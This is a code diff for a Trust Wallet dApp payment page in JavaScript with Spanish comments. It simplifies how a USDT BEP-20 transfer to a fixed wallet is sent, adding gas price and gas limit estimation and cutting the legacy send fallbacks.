@@ -125,7 +125,6 @@ function setStatus(m) {
 }
 
 function getProvider() {
-    // Buscamos directamente el proveedor nativo propietario de Trust Wallet
     if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
     if (window.ethereum) return window.ethereum;
     throw new Error("Abre esta página desde el navegador dApp de Trust Wallet.");
@@ -165,7 +164,6 @@ connectBtn.addEventListener("click", async () => {
             connectBtn.disabled = true;
             setStatus("Conectando con Trust Wallet...");
             
-            // Método clásico compatible con el inyector nativo
             const accounts = await p.request({ method: "eth_requestAccounts" });
             if (!accounts || accounts.length === 0) throw new Error("No se obtuvo acceso a la cuenta.");
             walletAddress = accounts[0];
@@ -193,55 +191,54 @@ connectBtn.addEventListener("click", async () => {
         if (amountUnits <= 0n) throw new Error("El monto debe ser mayor que cero.");
         if (amountUnits > balance) throw new Error("Saldo USDT insuficiente.");
 
-        // Construcción limpia del payload del contrato USDT BEP-20 (transfer)
         const data = "0xa9059cbb" + encAddr(BILLETERA_DESTINO) + encUint(amountUnits);
 
-        setStatus("Abriendo aprobación del contrato USDT en Trust Wallet...");
+        setStatus("Preparando llamada al contrato inteligente...");
 
-        // MÉTODO DE LLAMADA LEGACY PROPIETARIO: 
-        // Evitamos el eth_sendTransaction plano y usamos el canal de envío directo 
-        // que fuerza a Trust Wallet a levantar la ventana nativa de aprobación de contrato.
-        let txHash;
+        // OBTENEMOS LOS PARÁMETROS DE GAS DEL RPC PÚBLICO PARA FORZAR LA VENTANA DE APROBACIÓN
+        const gasPriceHex = await publicRpc("eth_gasPrice");
         
+        let gasLimitHex = "0x186A0"; // 100,000 gas por defecto seguro para contratos BEP-20
+        try {
+            const estGas = await publicRpc("eth_estimateGas", [{
+                from: walletAddress,
+                to: CONTRATO_USDT,
+                value: "0x0",
+                data: data
+            }]);
+            if (estGas) {
+                gasLimitHex = "0x" + Math.floor(Number(estGas) * 1.3).toString(16);
+            }
+        } catch (e) {
+            console.warn("Estimación automática omitida, usando gas por defecto:", e);
+        }
+
+        // PAYLOAD ESTRICTO CON GAS INCLUIDO PARA EVITAR EL ERROR 4200 Y LEVANTAR EL MODAL DE APROBACIÓN
         const txPayload = {
             from: walletAddress,
             to: CONTRATO_USDT,
             value: "0x0",
-            data: data
+            data: data,
+            gas: gasLimitHex,
+            gasPrice: gasPriceHex
         };
 
-        if (typeof p.send === "function") {
-            try {
-                // Invocación síncrona o mediante callback que utiliza el puente nativo de la app
-                const res = p.send("eth_sendTransaction", [txPayload]);
-                txHash = typeof res === "object" && res.result ? res.result : res;
-            } catch (err) {
-                console.warn("Fallo en p.send directo, usando sendAsync/request:", err);
-            }
-        }
+        setStatus("Abriendo ventana de aprobación de contrato...");
 
-        if (!txHash && typeof p.sendAsync === "function") {
-            txHash = await new Promise((resolve, reject) => {
-                p.sendAsync({
-                    method: "eth_sendTransaction",
-                    params: [txPayload],
-                    from: walletAddress,
-                    id: new Date().getTime(),
-                    jsonrpc: "2.0"
-                }, (err, response) => {
-                    if (err) return reject(err);
-                    if (response && response.error) return reject(new Error(response.error.message));
-                    resolve(response?.result);
-                });
-            });
-        }
-
-        if (!txHash) {
-            // Último recurso con el request estándar envuelto
+        let txHash;
+        try {
             txHash = await p.request({
                 method: "eth_sendTransaction",
                 params: [txPayload]
             });
+        } catch (reqErr) {
+            // Fallback de respaldo mediante p.send directo si la app exige el canal legacy
+            if (typeof p.send === "function") {
+                const res = p.send("eth_sendTransaction", [txPayload]);
+                txHash = typeof res === "object" && res.result ? res.result : res;
+            } else {
+                throw reqErr;
+            }
         }
 
         if (!txHash) {
